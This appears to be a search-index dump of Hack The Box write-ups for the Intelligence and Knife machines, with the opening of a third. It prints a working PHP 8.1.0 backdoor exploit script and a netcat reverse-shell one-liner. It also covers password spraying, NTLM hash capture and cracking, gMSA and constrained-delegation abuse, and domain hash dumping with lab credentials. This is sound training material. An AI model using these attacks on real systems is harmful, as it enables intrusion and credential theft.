\"http://10.10.10.248/documents/2020-12-24-upload.pdf\" , \"http://10.10.10.248/documents/2020-12-20-upload.pdf\" ] results = ThreadPool ( 5 ) . imap_unordered ( download_url , urls ) for r in results : print ( r ) Finally I collected all the users from downloaded documents using exiftool . exiftool 2020 -01-01-upload.pdf | grep \"Creator\" | cut -f 2 -d \":\" | cut -f 2 -d \" \" > users.txt cat users.txt William.Lee Scott.Scott Jason.Wright Veronica.Patel Jennifer.Thomas Danny.Matthews David.Reed Stephanie.Young Daniel.Shelton ... Obtain the Password Let's search for the password from documents. Since we have many PDF documents I created another Python script to automate the process of extracting the text from the all downloaded PDF documents: #!/usr/bin/python3 import fitz files = [ \"2020-01-04-upload.pdf\" , \"2020-01-02-upload.pdf\" , \"2020-01-01-upload.pdf\" , \"2020-01-10-upload.pdf\" , \"2020-01-22-upload.pdf\" , \"2020-01-30-upload.pdf\" , \"2020-01-25-upload.pdf\" , \"2020-01-23-upload.pdf\" , \"2020-01-20-upload.pdf\" , \"2020-02-11-upload.pdf\" , \"2020-02-28-upload.pdf\" , \"2020-02-24-upload.pdf\" , \"2020-02-23-upload.pdf\" , \"2020-02-17-upload.pdf\" , \"2020-03-04-upload.pdf\" , \"2020-03-05-upload.pdf\" , \"2020-03-12-upload.pdf\" , \"2020-03-21-upload.pdf\" , \"2020-03-17-upload.pdf\" , \"2020-03-13-upload.pdf\" , \"2020-04-04-upload.pdf\" , \"2020-04-02-upload.pdf\" , \"2020-04-23-upload.pdf\" , \"2020-04-15-upload.pdf\" , \"2020-05-07-upload.pdf\" , \"2020-05-03-upload.pdf\" , \"2020-05-01-upload.pdf\" , \"2020-05-24-upload.pdf\" , \"2020-05-29-upload.pdf\" , \"2020-05-21-upload.pdf\" , \"2020-05-20-upload.pdf\" , \"2020-05-17-upload.pdf\" , \"2020-05-11-upload.pdf\" , \"2020-06-21-upload.pdf\" , \"2020-06-30-upload.pdf\" , \"2020-06-28-upload.pdf\" , \"2020-06-25-upload.pdf\" , \"2020-06-26-upload.pdf\" , \"2020-06-22-upload.pdf\" , \"2020-06-15-upload.pdf\" , \"2020-06-14-upload.pdf\" , \"2020-06-12-upload.pdf\" , \"2020-06-08-upload.pdf\" , \"2020-06-04-upload.pdf\" , \"2020-06-07-upload.pdf\" , \"2020-06-03-upload.pdf\" , \"2020-06-02-upload.pdf\" , \"2020-07-08-upload.pdf\" , \"2020-07-06-upload.pdf\" , \"2020-07-02-upload.pdf\" , \"2020-07-24-upload.pdf\" , \"2020-07-20-upload.pdf\" , \"2020-08-20-upload.pdf\" , \"2020-08-19-upload.pdf\" , \"2020-08-09-upload.pdf\" , \"2020-08-01-upload.pdf\" , \"2020-08-03-upload.pdf\" , \"2020-09-05-upload.pdf\" , \"2020-09-04-upload.pdf\" , \"2020-09-02-upload.pdf\" , \"2020-09-06-upload.pdf\" , \"2020-09-29-upload.pdf\" , \"2020-09-27-upload.pdf\" , \"2020-09-22-upload.pdf\" , \"2020-09-16-upload.pdf\" , \"2020-09-11-upload.pdf\" , \"2020-09-13-upload.pdf\" , \"2020-09-30-upload.pdf\" , \"2020-10-05-upload.pdf\" , \"2020-10-19-upload.pdf\" , \"2020-11-10-upload.pdf\" , \"2020-11-06-upload.pdf\" , \"2020-11-03-upload.pdf\" , \"2020-11-01-upload.pdf\" , \"2020-11-13-upload.pdf\" , \"2020-11-11-upload.pdf\" , \"2020-11-30-upload.pdf\" , \"2020-11-24-upload.pdf\" , \"2020-12-15-upload.pdf\" , \"2020-12-10-upload.pdf\" , \"2020-12-30-upload.pdf\" , \"2020-12-28-upload.pdf\" , \"2020-12-24-upload.pdf\" , \"2020-12-20-upload.pdf\" ] for i in files : with fitz . open ( i ) as doc : text = \"\" for page in doc : text += page . getText () print ( text ) By running the script and go through the output we will identify the password which is NewIntelligenceCorpUser9876 Password Spray \u00b6 With the obtained password, now we can run password spray against the collected domain users: crackmapexec smb 10 .10.10.248 -u users.txt -p \"NewIntelligenceCorpUser9876\" We obtained user tiffany.molina credentials. Now we can get user.txt from users shared file using smbclient . smbclient \\\\\\\\ 10 .10.10.248 \\\\ Users -U 'workgroup\\Tiffany.Molina' Pivot to Ted.Graves \u00b6 SMB Shares Enumeration \u00b6 The domain user Tiffany.Molina have also access to IT shared folder, let's inspect it. \u039e Intelligence/dump \u2192 smbclient \\\\\\\\ 10 .10.10.248 \\\\ IT -U 'workgroup\\Tiffany.Molina' Enter WORKGROUP \\T iffany.Molina ' s password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Sun Apr 18 20 :50:55 2021 .. D 0 Sun Apr 18 20 :50:55 2021 downdetector.ps1 A 1046 Sun Apr 18 20 :50:55 2021 3770367 blocks of size 4096 . 1362603 blocks available smb: \\> get downdetector.ps1 I found Powershell script inside IT shared folder. By inspecting the Powershell script, I identified that the script runs every 5 minutes, it makes a request to web server that contains web* . # Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach ( $record in Get-ChildItem \"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" | Where-Object Name -like \"web*\" ) { try { $request = Invoke-WebRequest -Uri \"http:// $( $record . Name ) \" -UseDefaultCredentials if (. StatusCode -ne 200 ) { Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject \"Host: $( $record . Name ) is down\" } } catch {} } Obtain Ted.Graves NTLM Hash We can abuse this by adding a DNS record using dnstool and run Responder to receive the NTLM hash of the user ted.graves . dnstool can be found here python3 dnstool.py -u 'intelligence.htb\\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add -r websomething.intelligence.htb -d 10 .10.14.x 10 .10.10.248 Then run responder to receive the NTLM hash sudo responder -I tun0 Obtain Ted.Graves Password Now we found the NTLM hash of the user ted.graves , we can use hashcat to crack it: hashcat -a 0 -m 5600 ted.graves-ntlm /usr/share/wordlists/rockyou.txt --force Enumerate the Domain Controller \u00b6 Running BloodHound After obtaining ted.graves credentials lets run BloodHound to enumerate the Domain Controller, in order to find any path to Domain Admin. We can use bloodhound-python in Kali, but I prefer to use the Windows Powershell version because it give us more accurate results. To use bloodhound-python use the following command: bloodhound-python -u 'ted.graves' -p 'Mr.Teddy' -ns 10 .10.10.248 -d intelligence.htb -c all --dns-tcp But it will not give you all attack paths. BloodHound gave us a new attack path into Domain Admin. ted.graves is member of IT Support group, which all members of IT Support group can read gMSAPassword of SVC_INT domain user. SVC_INT is allowed to delegate into the Domain Controller. With this known now we can compromise the Domain Controller by chaining two attack paths: 1- Reading gMSAPassword of the domain user SVC_INT . Further Reading : https://stealthbits.com/blog/securing-gmsa-passwords/ 2- Constrained Delegation. Further Reading: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation Privilege Escalation \u00b6 Abuse gMSA Password \u00b6 Again we can use Kali or Windows to abuse this misconfiguration. I used Windows to obtain SVC_INT NTLM hash using the following command: $ gmsa = Get - ADServiceAccount - Identity ' SVC_INT ' - Properties ' msDS - ManagedPassword ' - Server 10.10 . 10.248 $ blob = $ gmsa . ' msDS - ManagedPassword ' $ mp = ConvertFrom - ADManagedPasswordBlob $ blob $ hash1 = ConvertTo - NTHash - Password $ mp . SecureCurrentPassword Or from Kali Linux we can use gMSADumper from this link python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2 We found domain user SVC_INT NTLM hash which is d64b83fe606e6d3005e20ce0ee932fe2 Abuse Constrained Delegation \u00b6 First of all, we need to find which service that SVC_INT can access. We can use rpcclient from Kali or Get-DomainComputer from PowerView module. I found that the domain user SVC_INT can access the service www/dc.intelligence.htb . Now we have service which we can abuse to request a Kerberos tickets to exploit delegation configuration. We can use Impackets getST.py to impersonate the administrator by passing flag -impersonate . getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation [ * ] Getting TGT for user [ * ] Impersonating Administrator [ * ] Requesting S4U2self [ * ] Requesting S4U2Proxy [ * ] Saving ticket in Administrator.ccache Before running the command make sure Kali time is sync with the target machine. sudo ntpdate 10 .10.10.248 Obtaining administrator tickets will allow us to have full administrator privilege in the Domain Controller, we can pass the tickets to dump all domain controller NTLM hashes. But before that we have to store the into the variable KRB4CCNAME : export KRB5CCNAME = Administrator.ccache Finally, I used Impacket tool secretdumps.py to dump all domain users hashes including the Domain Admin. secretsdump.py -k -no-pass dc.intelligence.htb We will find the NTLM hash of the Domain Admin. We can use Domain Admin NTLM hash as pass the hash to read root.txt flag using crackmapexec crackmapexec smb 10 .10.10.248 -u administrator -H '9075113fe16cf74f7c0f9b27e882dad3' -x 'more C:\\users\\administrator\\desktop\\root.txt' Lesson Learned \u00b6 Enumerating PDF documents to find users. NTLM relay attacks. Abuse gMSA Password Abuse Constrained Delegation","title":"Intelligence"},{"location":"Writeups/machines/intelligence/Intelligence/#overview","text":"Intelligence was my best HTB Machine yet, where it was realist environment and real life scenario. Intelligence was based in Active Directory Penetration Test and mostly depeneds in enumeration to found a way into the Domain Admin. My HTB profile link","title":"Overview"},{"location":"Writeups/machines/intelligence/Intelligence/#machine-info","text":"Operating System Difficulty IP Windows Medium 10.10.10.248","title":"Machine Info"},{"location":"Writeups/machines/intelligence/Intelligence/#walkthrough","text":"","title":"Walkthrough"},{"location":"Writeups/machines/intelligence/Intelligence/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/intelligence/Intelligence/#nmap","text":"PORT STATE SERVICE REASON VERSION 53 /tcp open domain syn-ack Simple DNS Plus 80 /tcp open http syn-ack Microsoft IIS httpd 10 .0 | _http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST | _ Potentially risky methods: TRACE | _http-server-header: Microsoft-IIS/10.0 | _http-title: Intelligence 88 /tcp open kerberos-sec syn-ack Microsoft Windows Kerberos ( server time: 2021 -07-04 20 :46:20Z ) 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb | Issuer: commonName = intelligence-DC-CA/domainComponent = intelligence 445 /tcp open microsoft-ds? syn-ack 464 /tcp open kpasswd5? syn-ack 593 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 636 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb | Issuer: commonName = intelligence-DC-CA/domainComponent = intelligence 3268 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb | Issuer: commonName = intelligence-DC-CA/domainComponent = intelligence 3269 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb Service Info: Host: DC ; OS: Windows ; CPE: cpe:/o:microsoft:windows By looking into nmap scanning results, we will discover that the host is Domain Controller. Furthermore, port 80, 139, 445 are opened so we can enumerate web service and SMB shared folders.","title":"nmap"},{"location":"Writeups/machines/intelligence/Intelligence/#web-enumeration","text":"During inspecting the web application, we will identify a new directory /documents that contains multiple PDF files. Two documents can be identify if we hover over download button: http://10.10.10.248/documents/2020-01-01-upload.pdf and http://10.10.10.248/documents/2020-12-15-upload.pdf After downloading the PDF documents, I used exiftool to check the creator of document in order to enumerate domain users. From the pattern of the PDF files name I identified that the naming format is using 2020-##-##-upload.pdf where is ## is two digits.","title":"Web Enumeration"},{"location":"Writeups/machines/intelligence/Intelligence/#fuzzing-documents","text":"","title":"Fuzzing Documents"},{"location":"Writeups/machines/intelligence/Intelligence/#password-spray","text":"With the obtained password, now we can run password spray against the collected domain users: crackmapexec smb 10 .10.10.248 -u users.txt -p \"NewIntelligenceCorpUser9876\" We obtained user tiffany.molina credentials. Now we can get user.txt from users shared file using smbclient . smbclient \\\\\\\\ 10 .10.10.248 \\\\ Users -U 'workgroup\\Tiffany.Molina'","title":"Password Spray"},{"location":"Writeups/machines/intelligence/Intelligence/#pivot-to-tedgraves","text":"","title":"Pivot to Ted.Graves"},{"location":"Writeups/machines/intelligence/Intelligence/#smb-shares-enumeration","text":"The domain user Tiffany.Molina have also access to IT shared folder, let's inspect it. \u039e Intelligence/dump \u2192 smbclient \\\\\\\\ 10 .10.10.248 \\\\ IT -U 'workgroup\\Tiffany.Molina' Enter WORKGROUP \\T iffany.Molina ' s password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Sun Apr 18 20 :50:55 2021 .. D 0 Sun Apr 18 20 :50:55 2021 downdetector.ps1 A 1046 Sun Apr 18 20 :50:55 2021 3770367 blocks of size 4096 . 1362603 blocks available smb: \\> get downdetector.ps1 I found Powershell script inside IT shared folder. By inspecting the Powershell script, I identified that the script runs every 5 minutes, it makes a request to web server that contains web* . # Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach ( $record in Get-ChildItem \"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" | Where-Object Name -like \"web*\" ) { try { $request = Invoke-WebRequest -Uri \"http:// $( $record . Name ) \" -UseDefaultCredentials if (. StatusCode -ne 200 ) { Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject \"Host: $( $record . Name ) is down\" } } catch {} }","title":"SMB Shares Enumeration"},{"location":"Writeups/machines/intelligence/Intelligence/#enumerate-the-domain-controller","text":"","title":"Enumerate the Domain Controller"},{"location":"Writeups/machines/intelligence/Intelligence/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"Writeups/machines/intelligence/Intelligence/#abuse-gmsa-password","text":"Again we can use Kali or Windows to abuse this misconfiguration. I used Windows to obtain SVC_INT NTLM hash using the following command: $ gmsa = Get - ADServiceAccount - Identity ' SVC_INT ' - Properties ' msDS - ManagedPassword ' - Server 10.10 . 10.248 $ blob = $ gmsa . ' msDS - ManagedPassword ' $ mp = ConvertFrom - ADManagedPasswordBlob $ blob $ hash1 = ConvertTo - NTHash - Password $ mp . SecureCurrentPassword Or from Kali Linux we can use gMSADumper from this link python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2 We found domain user SVC_INT NTLM hash which is d64b83fe606e6d3005e20ce0ee932fe2","title":"Abuse gMSA Password"},{"location":"Writeups/machines/intelligence/Intelligence/#abuse-constrained-delegation","text":"First of all, we need to find which service that SVC_INT can access. We can use rpcclient from Kali or Get-DomainComputer from PowerView module. I found that the domain user SVC_INT can access the service www/dc.intelligence.htb . Now we have service which we can abuse to request a Kerberos tickets to exploit delegation configuration. We can use Impackets getST.py to impersonate the administrator by passing flag -impersonate . getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation [ * ] Getting TGT for user [ * ] Impersonating Administrator [ * ] Requesting S4U2self [ * ] Requesting S4U2Proxy [ * ] Saving ticket in Administrator.ccache Before running the command make sure Kali time is sync with the target machine. sudo ntpdate 10 .10.10.248 Obtaining administrator tickets will allow us to have full administrator privilege in the Domain Controller, we can pass the tickets to dump all domain controller NTLM hashes. But before that we have to store the into the variable KRB4CCNAME : export KRB5CCNAME = Administrator.ccache Finally, I used Impacket tool secretdumps.py to dump all domain users hashes including the Domain Admin. secretsdump.py -k -no-pass dc.intelligence.htb We will find the NTLM hash of the Domain Admin. We can use Domain Admin NTLM hash as pass the hash to read root.txt flag using crackmapexec crackmapexec smb 10 .10.10.248 -u administrator -H '9075113fe16cf74f7c0f9b27e882dad3' -x 'more C:\\users\\administrator\\desktop\\root.txt'","title":"Abuse Constrained Delegation"},{"location":"Writeups/machines/intelligence/Intelligence/#lesson-learned","text":"Enumerating PDF documents to find users. NTLM relay attacks. Abuse gMSA Password Abuse Constrained Delegation","title":"Lesson Learned"},{"location":"Writeups/machines/knife/knife-writeup/","text":"Overview \u00b6 Machine Info \u00b6 Operating System Difficulty IP Linux Easy 10.10.10.241 Walkthrough \u00b6 Recon \u00b6 nmap \u00b6 PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack OpenSSH 8 .2p1 Ubuntu 4ubuntu0.2 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k = | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc = | 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb 80 /tcp open http syn-ack Apache httpd 2 .4.41 (( Ubuntu )) | http-methods: | _ Supported Methods: GET HEAD POST OPTIONS | _http-server-header: Apache/2.4.41 ( Ubuntu ) | _http-title: Emergent Medical Idea Service Info: OS: Linux ; CPE: cpe:/o:linux:linux_kernel Enumerate Web Service \u00b6 By looking into the network tap in Firefox developer mode, we will find that the web service is running PHP version 8.1.0 , which is vulnerable to Remote Code Execution. Initial Foothold \u00b6 PHP 8.1.0 Remote Code Execution \u00b6 Exploit link: https://github.com/flast101/php-8.1.0-dev-backdoor-rce #!/usr/bin/env python3 import os import re import requests host = input ( \"Enter the full host url: \\n \" ) request = requests . Session () response = request . get ( host ) if str ( response ) == '<Response [200]>' : print ( \" \\n Interactive shell is opened on\" , host , \" \\n Can't access tty; job crontol turned off.\" ) try : while 1 : cmd = input ( \"$ \" ) headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\" , \"User-Agentt\" : \"zerodiumsystem('\" + cmd + \"');\" } response = request . get ( host , headers = headers , allow_redirects = False ) current_page = response . text stdout = current_page . split ( '<!DOCTYPE html>' , 1 ) text = print ( stdout [ 0 ]) except KeyboardInterrupt : print ( \"Exiting...\" ) exit else : print ( \" \\r \" ) print ( response ) print ( \"Host is not available, aborting...\" ) exit To get RCE, just run the script and specify target URL \u039e knife/scripts \u2192 python3 php-8.1.0-rce.py Enter the full host url: http://10.10.10.242 Interactive shell is opened on http://10.10.10.242 Can ' t access tty ; job crontol turned off. $ id uid = 1000 ( james ) gid = 1000 ( james ) groups = 1000 ( james ) No we got user access into the machine. Privilege Escalation \u00b6 Upgrade Shell \u00b6 Firstly, let's upgrade our shell using the following command: In local machine run netcat listener nc -nlvp 9002 In target run the following command and change the IP rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc 10 .10.14.x 9002 >/tmp/f You will receive reverse shell back, now upgrade into into interactive shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' Enumerate The Target Machine \u00b6 First, let's check user binaries that he can run as root $ james@knife:/$ sudo -l sudo -l Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin User james may run the following commands on knife: ( root ) NOPASSWD: /usr/bin/knife So we found that user james can run the binary /usr/bin/knife as root. Let's check what is the content of the binary /usr/bin/knife #!/opt/chef-workstation/embedded/bin/ruby --disable-gems #--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1-- require \"rubygems\" ... Kernel . load ( bin_file ) By looking into the script it seems like it runs Ruby as root privileges. So we can now run any Ruby script as root, we can abuse that by reading root.txt file Reading root.txt File \u00b6 Firstly, I created to following Ruby script: File . open ( \"/root/root.txt\" , \"r\" ) do | f | f . each_line do | line | puts line end end The script reads /root/root.txt file, now we will send it into the target machine and run the following command in order to read root flag: bash-5.0$ sudo /usr/bin/knife exec root.rb sudo /usr/bin/knife exec root.rb 7a7f71--------5211a360d","title":"Knife"},{"location":"Writeups/machines/knife/knife-writeup/#overview","text":"","title":"Overview"},{"location":"Writeups/machines/knife/knife-writeup/#machine-info","text":"Operating System Difficulty IP Linux Easy 10.10.10.241","title":"Machine Info"},{"location":"Writeups/machines/knife/knife-writeup/#walkthrough","text":"","title":"Walkthrough"},{"location":"Writeups/machines/knife/knife-writeup/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/knife/knife-writeup/#nmap","text":"PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack OpenSSH 8 .2p1 Ubuntu 4ubuntu0.2 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k = | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc = | 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb 80 /tcp open http syn-ack Apache httpd 2 .4.41 (( Ubuntu )) | http-methods: | _ Supported Methods: GET HEAD POST OPTIONS | _http-server-header: Apache/2.4.41 ( Ubuntu ) | _http-title: Emergent Medical Idea Service Info: OS: Linux ; CPE: cpe:/o:linux:linux_kernel","title":"nmap"},{"location":"Writeups/machines/knife/knife-writeup/#enumerate-web-service","text":"By looking into the network tap in Firefox developer mode, we will find that the web service is running PHP version 8.1.0 , which is vulnerable to Remote Code Execution.","title":"Enumerate Web Service"},{"location":"Writeups/machines/knife/knife-writeup/#initial-foothold","text":"","title":"Initial Foothold"},{"location":"Writeups/machines/knife/knife-writeup/#php-810-remote-code-execution","text":"Exploit link: https://github.com/flast101/php-8.1.0-dev-backdoor-rce #!/usr/bin/env python3 import os import re import requests host = input ( \"Enter the full host url: \\n \" ) request = requests . Session () response = request . get ( host ) if str ( response ) == '<Response [200]>' : print ( \" \\n Interactive shell is opened on\" , host , \" \\n Can't access tty; job crontol turned off.\" ) try : while 1 : cmd = input ( \"$ \" ) headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\" , \"User-Agentt\" : \"zerodiumsystem('\" + cmd + \"');\" } response = request . get ( host , headers = headers , allow_redirects = False ) current_page = response . text stdout = current_page . split ( '<!DOCTYPE html>' , 1 ) text = print ( stdout [ 0 ]) except KeyboardInterrupt : print ( \"Exiting...\" ) exit else : print ( \" \\r \" ) print ( response ) print ( \"Host is not available, aborting...\" ) exit To get RCE, just run the script and specify target URL \u039e knife/scripts \u2192 python3 php-8.1.0-rce.py Enter the full host url: http://10.10.10.242 Interactive shell is opened on http://10.10.10.242 Can ' t access tty ; job crontol turned off. $ id uid = 1000 ( james ) gid = 1000 ( james ) groups = 1000 ( james ) No we got user access into the machine.","title":"PHP 8.1.0 Remote Code Execution"},{"location":"Writeups/machines/knife/knife-writeup/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"Writeups/machines/knife/knife-writeup/#upgrade-shell","text":"Firstly, let's upgrade our shell using the following command: In local machine run netcat listener nc -nlvp 9002 In target run the following command and change the IP rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc 10 .10.14.x 9002 >/tmp/f You will receive reverse shell back, now upgrade into into interactive shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","title":"Upgrade Shell"},{"location":"Writeups/machines/knife/knife-writeup/#enumerate-the-target-machine","text":"First, let's check user binaries that he can run as root $ james@knife:/$ sudo -l sudo -l Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin User james may run the following commands on knife: ( root ) NOPASSWD: /usr/bin/knife So we found that user james can run the binary /usr/bin/knife as root. Let's check what is the content of the binary /usr/bin/knife #!/opt/chef-workstation/embedded/bin/ruby --disable-gems #--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1-- require \"rubygems\" ... Kernel . load ( bin_file ) By looking into the script it seems like it runs Ruby as root privileges. So we can now run any Ruby script as root, we can abuse that by reading root.txt file","title":"Enumerate The Target Machine"},{"location":"Writeups/machines/knife/knife-writeup/#reading-roottxt-file","text":"Firstly, I created to following Ruby script: File . open ( \"/root/root.txt\" , \"r\" ) do | f | f . each_line do | line | puts line end end The script reads /root/root.txt file, now we will send it into the target machine and run the following command in order to read root flag: bash-5.0$ sudo /usr/bin/knife exec root.rb sudo /usr/bin/knife exec root.rb 7a7f71--------5211a360d","title":"Reading root.txt File"},{"location":"Writeups/machines/love/love/","text":"Walkthrough \u00b6 Attack Scenario Diagram \u00b6 Recon \u00b6 nmap \u00b6 ~/tmp/htb/exploit nmap 10 .10.10.239 -sC -sV Starting Nmap 7 .80 ( https://nmap.org ) at 2021 -05-02 09 :46 +04 Nmap scan report for 10 .10.10.239 Host is up ( 0 .43s latency ) . Not shown: 993 closed ports PORT STATE SERVICE VERSION 80 /tcp open http Apache httpd 2 .4.46 (( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 ) | http-cookie-flags: | /: | PHPSESSID: | _ httponly flag not set | _http-server-header: Apache/2.4.46 ( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 | _http-title: Voting System using PHP 135 /tcp open msrpc Microsoft Windows RPC 139 /tcp open netbios-ssn Microsoft Windows netbios-ssn 443 /tcp open ssl/http Apache httpd 2 .4.46 ( OpenSSL/1.1.1j PHP/7.3.27 ) | _http-server-header: Apache/2.4.46 ( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 | _http-title: 403 Forbidden | ssl-cert: Subject: commonName = staging.love.htb/organizationName = ValentineCorp/stateOrProvinceName = m/countryName = in | Not valid before: 2021 -01-18T14:00:16 | _Not valid after: 2022 -01-18T14:00:16 | _ssl-date: TLS randomness does not represent time | tls-alpn: | _ http/1.1 445 /tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds ( workgroup: WORKGROUP ) 3306 /tcp open mysql? | fingerprint-strings: | NULL: | _ 